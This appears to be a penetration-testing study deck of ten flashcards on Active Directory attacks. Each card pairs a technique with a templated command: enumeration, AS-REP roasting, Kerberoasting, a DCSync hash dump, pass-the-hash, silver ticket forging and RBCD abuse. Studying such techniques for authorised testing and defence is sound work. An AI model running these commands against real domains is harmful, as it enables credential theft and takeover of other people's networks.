title: "Active Directory"
description: "AD enumeration, attacks, and exploitation techniques"
cards:
  - question: "Enumerate all AD users via LDAP anonymous bind"
    answer: "ldapsearch -x -H ldap://<dc> -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName"
  - question: "Request a TGT for a user to check if they exist"
    answer: "kerbrute userenum -d <domain> <wordlist> --dc <dc>"
  - question: "AS-REP roast — find users without pre-auth"
    answer: "impacket-GetNPUsers -dc-ip <dc> <domain>/<user>: -request"
  - question: "Kerberoast — request TGS for SPN accounts"
    answer: "impacket-GetUserSPNs -dc-ip <dc> <domain>/<user>:<pass> -request"
  - question: "Dump all domain hashes via DCSync"
    answer: "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc>"
  - question: "Pass-the-Hash with Impacket"
    answer: "impacket-wmiexec -hashes :<ntlm> <domain>/<user>@<target>"
  - question: "Silver ticket attack"
    answer: "impacket-ticketer -nthash <service-hash> -domain-sid <sid> -domain <domain> -spn <service>/<host> <user>"
  - question: "BloodHound data ingestion"
    answer: "bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc>"
  - question: "Abuse GenericWrite on a user to force Kerberos delegation"
    answer: "bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set rbcd <target> <attacker>"
  - question: "Check for pre-created computer accounts (pre2k)"
    answer: "netexec ldap <dc> -d <domain> -u <user> -p <pass> -M pre2k"
